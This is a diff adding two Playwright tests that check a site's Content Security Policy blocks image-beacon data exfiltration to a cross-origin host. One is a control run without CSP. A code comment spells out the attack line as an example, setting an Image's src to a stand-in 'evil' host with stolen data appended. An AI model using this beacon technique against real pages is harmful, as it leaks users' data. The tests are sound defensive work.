@@ -118,6 +118,40 @@ test.describe('CSP — real browser enforcement', () => {
     expect((await violations(page)).some((x) => x.violatedDirective.startsWith('connect-src'))).toBe(false)
   })
 
+  test("blocks a cross-origin image-beacon exfil (img-src 'self' data:)", async ({ page }) => {
+    await installCollector(page)
+    await page.goto('/')
+    // A fetch-free exfil channel connect-src does NOT cover: `new Image().src = 'https://evil/?d=' + data`.
+    // img-src governs sub-resource image loads, so a cross-origin image must fire an img-src violation.
+    await page.evaluate(
+      (target) =>
+        new Promise<void>((resolve) => {
+          const img = new Image()
+          img.onload = () => resolve()
+          img.onerror = () => resolve() // a CSP block manifests as a load error; the violation fires first
+          img.src = `${target}/probe.png`
+        }),
+      CONTROL_ORIGIN,
+    )
+    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(true)
+  })
+
+  test('CONTROL: the same image-beacon raises no img-src violation with no CSP', async ({ page }) => {
+    await installCollector(page)
+    await page.goto(`${CONTROL_ORIGIN}/`)
+    await page.evaluate(
+      (target) =>
+        new Promise<void>((resolve) => {
+          const img = new Image()
+          img.onload = () => resolve()
+          img.onerror = () => resolve()
+          img.src = `${target}/probe.png`
+        }),
+      'http://127.0.0.1:4180',
+    )
+    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(false)
+  })
+
   test("engine module Web Worker constructs + round-trips under worker-src 'self'", async ({ page }) => {
     await installCollector(page)
     await page.goto('/')
